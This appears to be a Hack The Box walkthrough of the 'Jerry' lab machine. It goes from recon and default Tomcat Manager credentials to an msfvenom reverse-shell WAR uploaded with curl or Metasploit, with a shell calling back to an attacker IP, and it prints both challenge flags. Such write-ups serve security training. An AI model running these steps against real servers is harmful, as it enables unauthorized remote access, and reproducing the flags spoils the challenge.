#!/bin/bash

# JERRY (HTB)
  Jerry is an Easy Windows machine running Apache Tomcat with default credentials on the Manager interface.
  The attack path:
  Nmap -> discover Tomcat on port 8080 -> access Manager -> deploy a malicious WAR file -> get shell -> read flags (already NT AUTHORITY\SYSTEM)

# PHASE1 RECON : Reconnaissance - Nmap Scanning
  ~/htb/jerry$ 'nmap -sC -sV -oN initial.txt $TARGET'
   FORMAT- PORT STATE SERVICE VERSION
  ~/htb/jerry$ 'nmap -p- --min-rate 5000 -oN allports.txt $TARGET'
   FORMAT- PORT STATE SERVICE
# PHASE2 ENUM : Enumeration - Web Application Investigation
STEP 1: Browse manually
 Open browser -> http://10.10.10.95:8080 (Apache Tomcat default page)
  Look for the Manager App button on the right side
STEP 2: Click "Manager App" -> browser asks for authentication
 Try default Tomcat credentials (from SecLists or memory):
  tomcat:tomcat <- most common
  admin:admin
  tomcat:s3cret <- specifically mentioned on HTB Jerry
  admin:password
STEP 3: Directory enumeration (run in parallel)
 ~/htb/jerry$ 'gobuster dir -u http://$TARGET:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster.txt'
  /manager (Status: 302) -> /manager/html
  /docs (Status: 302)
  /examples (Status: 302)
   /manager confirms the Manager interface exists
STEP 4: Test credentials via curl (verifies credentials programmatically)
 ~/htb/jerry$ 'curl -u 'tomcat:s3cret' http://$TARGET:8080/manager/html'
  <title>Tomcat Web Application Manager</title>
  <h1>Tomcat Web Application Manager</h1>
   HTML of the manager page returned -> credentials confirmed
# PHASE3 EXPLOIT : Exploitation - WAR File Upload via Tomcat Manager
  Two methods: manual (msfvenom + curl) and Metasploit
  "Method A - Manual : Manual WAR Shell"
   STEP 1: Create a WAR file with a reverse shell payload
    WAR = Web Application Archive (deployed to Tomcat)
   ~/htb/jerry$ msfvenom -p java/jsp_shell_reverse_tcp \
     LHOST=10.10.14.5 LPORT=4444 \
     -f war -o shell.war
    Payload size: 1102 bytes
    Saved as: shell.war
    LHOST = your Kali tun0 IP
    LPORT = port to listen on
   STEP 2: Upload the WAR file via curl
    ~/htb/jerry$ curl -u 'tomcat:s3cret' \
      -T shell.war \
      http://$TARGET:8080/manager/text/deploy?path=/shell
    OK - Deployed application at context path [/shell]
   STEP 3: Start a netcat listener BEFORE triggering the shell
    SYNTAX- 'nc -lvnp 4444'
   STEP 4: Trigger the shell by accessing the deployed app
    SYNTAX- 'curl http://$TARGET:8080/shell/'
   Back in your nc terminal:
    Connect to [10.10.14.5] from [10.10.10.95] 49219
    Microsoft Windows [Version 6.3.9600]
    C:\apache-tomcat-7.0.88>
  "Method B - Metasploit"
   msf6 > 'use exploit/multi/http/tomcat_mgr_upload'
   msf6 > 'set RHOSTS 10.10.10.95'
   msf6 > 'set RPORT 8080'
   msf6 > 'set HttpUsername tomcat'
   msf6 > 'set HttpPassword s3cret'
   msf6 > 'set LHOST 10.10.14.5'
   msf6 > 'run'
    [+] Meterpreter session 1 opened
   meterpreter > 'getuid'
    NT AUTHORITY\SYSTEM
    Already SYSTEM, No privesc needed on Jerry.
# PHASE4 POST-EXPLOIT : Post-Exploitation - Find Flags and Enumerate the System
1. First thing after getting a shell
   C:\> 'whoami
    nt authority\system <- Already highest privilege on Windows
   C:\> 'systeminfo'
    Host Name: JERRY
    OS Name: Microsoft Windows Server 2012 R2 Standard
    OS Version: 6.3.9600 N/A Build 9600
    System Type: x64-based PC
    Document: OS, version, architecture, hostname
2. Find the flags
   C:\> 'dir C:\Users\Administrator\Desktop\flags'
    2018-06-12 09:41 0 2 for the price of 1.txt
    Jerry has both flags (user and root) in one file
   C:\> 'type "C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt"
    user.txt
    7004dbcef0f854e0fb401875f26ebd00
    root.txt
    04a8b36e1545a455393d067e772fe90e
    Submit both flags on the HTB website. Machine owned.
# Additional post-exploitation
  C:\> 'net users'
  C:\> 'ipconfig /all'
  C:\> 'netstat -ano'
  C:\> 'tasklist'
   These reveal: network configuration, running processes, listening services
